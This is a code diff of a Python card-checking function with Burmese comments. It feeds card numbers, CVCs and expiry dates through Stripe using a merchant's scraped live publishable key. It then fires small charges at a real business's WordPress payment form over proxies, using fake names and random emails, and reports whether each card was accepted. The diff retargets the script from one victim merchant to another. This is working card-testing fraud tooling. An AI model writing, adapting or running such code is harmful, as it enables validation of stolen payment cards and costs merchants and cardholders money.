@@ -45,9 +45,7 @@ def Tele(ccx):
         session.proxies = proxies
 
         # ==========================================
-        # Step 1: Create Payment Method (Stripe)
-        # ==========================================
-        # 🔥 Headers အသစ်
+        # Step 1: Create Payment Method (PM)
         headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -58,81 +56,76 @@ def Tele(ccx):
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         }
 
-        # 🔥 Payload အသစ် (Key အသစ် pk_live_51J8k... နဲ့)
-        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51J8kG2G2tMgizZNRMjj44SnaRkCM7h2HBjLkazWyqrBE1NkCnsbFpxiq6xoPDfi5q0tB9ww94e6LlOXm9qlG4rkC001IGNVBQK'
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51HS2e7IM93QTW3d6EuHHNKQ2lAFoP1sepEHzJ7l1NWvDr7q2vEbmp3v5GM6gwdtgmO3HnEQ3JGeWtZJNXiNEd97M0067w1jUqv'
 
+        # session.post ကိုသုံးပြီး Timeout 40s ထားသည်
         response = session.post(
-            'https://api.stripe.com/v1/payment_methods',
-            headers=headers,
+            'https://api.stripe.com/v1/payment_methods', 
+            headers=headers, 
             data=data,
-            timeout=40 
+            timeout=40
         )
-
+        
+        # Error Checking for PM creation
         if 'id' not in response.json():
-            return "Proxy Error (PM Failed) ❌"
+            return "Error Creating Payment Method ❌"
             
         pm = response.json()['id']
 
-        # ==========================================
-        # Step 2: Charge Request (Acting Academy)
-        # ==========================================
-        # 🔥 Acting Academy Headers
+        # Step 2: Charge Request
         headers = {
-            'authority': 'actingacademy.ie',
-            'accept': 'application/json, text/javascript, */*; q=0.01',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://actingacademy.ie',
-            'referer': 'https://actingacademy.ie/booking-payment/',
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://farmingdalephysicaltherapywest.com',
+            'Referer': 'https://farmingdalephysicaltherapywest.com/make-payment/',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+            'X-Requested-With': 'XMLHttpRequest',
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
         }
 
-        # 🔥 Acting Academy Data
         data = {
             'action': 'wp_full_stripe_inline_payment_charge',
-            'wpfs-form-name': 'payment_form',
+            'wpfs-form-name': 'Payment-Form',
             'wpfs-form-get-parameters': '%7B%7D',
-            'wpfs-custom-amount-unique': '0.5',
-            'wpfs-custom-input[]': [
-                'Min Thant', # နာမည်ကတော့ မူရင်းအတိုင်းထားထားတယ်
-                '19',
-                'New York',
-            ],
-            'wpfs-card-holder-email': random_email, # 🔥 Random Email သုံးလိုက်ပြီ
-            'wpfs-card-holder-name': 'Su Su',
+            'wpfs-custom-amount-unique': '0.5', 
+            'wpfs-custom-input[]': 'Super',
+            'wpfs-card-holder-email': random_email, 
+            'wpfs-card-holder-name': 'Mr Virus',
             'wpfs-stripe-payment-method-id': f'{pm}',
         }
 
+        # session.post ကိုသုံးပြီး Timeout 40s ထားသည်
         response = session.post(
-            'https://actingacademy.ie/wp-admin/admin-ajax.php',
+            'https://farmingdalephysicaltherapywest.com/wp-admin/admin-ajax.php',
             headers=headers,
             data=data,
             timeout=40
         )
         
-        # Result စစ်ဆေးခြင်း
+        # Result ကို ယူမယ်
         try:
-            # WP Full Stripe က success: true/false နဲ့ message ပြန်ပေးလေ့ရှိတယ်
-            resp_json = response.json()
-            if resp_json.get('success') == True:
-                result = "Charged 1.5€ ✅"
-            else:
-                # Message ကိုဆွဲထုတ်မယ်
-                result = resp_json.get('message', 'Decline⛔')
+            result = response.json().get('message', 'No message in response')
         except:
             if "Cloudflare" in response.text or response.status_code == 403:
                 result = "IP Blocked by Site ❌"
             else:
-                result = response.text # ဘာပြန်လာလဲမသိရင် text ထုတ်ကြည့်မယ်
+                result = "Request Failed ⚠️"
 
     except Exception as e:
+        # Retry Limit ကျော်သွားရင် Error ပြမယ်
         result = f"Connection Failed (Retry Limit) ⚠️"
-        
+
     return result
